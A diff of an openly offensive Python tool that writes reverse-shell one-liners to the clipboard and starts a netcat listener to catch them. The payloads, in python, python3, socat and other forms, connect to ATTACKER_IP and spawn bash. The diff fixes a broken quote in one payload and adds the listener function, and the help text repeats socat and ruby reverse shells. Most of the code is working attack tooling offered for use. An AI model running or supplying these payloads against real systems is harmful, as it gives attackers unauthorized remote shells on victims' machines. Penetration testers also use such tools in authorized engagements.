@@ -17,13 +17,13 @@ end = "\033[0m"
                                           
                                                                                     
 def ap(text) :
-    print(f"{bold}{green}\t[+] {end}{text}")
+    print(f"{bold}{green}[+] {end}{text}")
     #print(bold,green,"[+]",end,text)
 def ainfo(text) :
-    print(f"{bold}{purple}\t[*] {end}{text}")
+    print(f"{bold}{purple}[*] {end}{text}")
     #print(bold,purple,"[*]",end,text)
 def aerr(text) : 
-    print(f"{bold}{red}\t[-] {end}{text}") 
+    print(f"{bold}{red}[-] {end}{text}") 
     #print(bold,red,"[-]",end,text)
 
 parser = argparse.ArgumentParser(description="""
@@ -33,7 +33,7 @@ parser = argparse.ArgumentParser(description="""
  ___/ / / / /  __/ / /_/  __/ /    
 /____/_/ /_/\___/_/\__/\___/_/     
                                                                       
-Version: v1.0.1 - 06/04/21 - Bides Das @Xyan1d3 """,formatter_class=RawTextHelpFormatter)
+Version: v1.0.2 - 06/04/21 - Bides Das @Xyan1d3 """,formatter_class=RawTextHelpFormatter)
 
 subparser = parser.add_subparsers(title="Available Modules", dest="module")
 rev = subparser.add_parser("rev",help="Revshell to clipboard")
@@ -57,19 +57,19 @@ pyexport = rev_sub.add_parser("pyexport",help="""export RHOST="ATTACKER_IP";expo
 socat = rev_sub.add_parser("socat",help="socat TCP:ATTACKER_IP:ATTACKER_PORT EXEC:'bash',pty,stderr,setsid,sigint,sane")
 #ruby = rev_sub.add_parser("ruby",help="""ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",ATTACKER_PORT).to_i;exec sprintf("bash -i <&'%'d >&'%'d 2>&'%'d",f,f,f)'""")
 
-bash.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
-bashi.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
-bash196.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
-bashrl.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
-bash5.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
-bashudp.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
-nc_mkfifo.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
-perl.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
-py2.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
-py.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
-py2export.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
-pyexport.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
-socat.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
+bash.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+bashi.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+bash196.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+bashrl.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+bash5.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+bashudp.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+nc_mkfifo.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+perl.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+py2.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+py.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+py2export.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+pyexport.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
+socat.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
 
 args = parser.parse_args()
 
@@ -117,18 +117,28 @@ def shell_cpy(language,ATTACKER_IP,ATTACKER_PORT): # This function takes attacke
     "py2" : f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ATTACKER_IP}",{ATTACKER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'""",
     "py" : f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ATTACKER_IP}",{ATTACKER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'""",
     "py2export" : f"""export RHOST="{ATTACKER_IP}";export RPORT={ATTACKER_PORT};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'""",
-    "pyexport" : f"""export RHOST="{ATTACKER_IP}";export RPORT={ATTACKER_PORT};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")""",
+    "pyexport" : f"""export RHOST="{ATTACKER_IP}";export RPORT={ATTACKER_PORT};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'""",
     "socat" : f"socat TCP:{ATTACKER_IP}:{ATTACKER_PORT} EXEC:'bash',pty,stderr,setsid,sigint,sane"
     }
     if language == "":
         return payloads["bash"]
     return payloads[language]
-
+def shell_handler(port,proto):
+    if proto == "tcp":
+        os.system(f"nc -lvnp {fetch_port()}")
+    elif proto == "udp":
+        os.system(f"nc -luvnp {fetch_port()}")
 if args.module == "rev": # Checks for 1st pos arg if its rev.
     if args.sub in list(rev_sub.choices.keys()): # Checks if the 2nd pos arg is valid language for revshell payload.
         pyperclip.copy(shell_cpy(args.sub,fetch_ip(),fetch_port())) # It will take 2nd positional arg as language and copy the revshell in the clipboard.
-        #print(shell_cpy(args.sub,"127.0.0.1",8888))
+        if not args.nohandler:
+            ap("Starting up Shell Handler...")
+            if "udp".lower() in shell_cpy(args.sub,fetch_ip(),fetch_port()).lower(): # Checks if udp is present in the revshell then starts netcat with udp support
+                shell_handler(fetch_port(),"udp") # Invokes netcat listener with UDP support.
+            else:
+                shell_handler(fetch_port(),"tcp") # Invokes netcat listener on tcp mode.
+        else:
+            ainfo("No Handler flag detected. Handler will not be started.")
     else:
         pyperclip.copy(shell_cpy("bash",fetch_ip(),fetch_port())) # If 2nd positional arg is not supplied it will fallback to bash base64 encoded revshell.
-        #print(shell_cpy("bash","127.0.0.1",8888))
-    
+        shell_handler(fetch_port(),"tcp") # Invokes netcat listener on tcp mode.
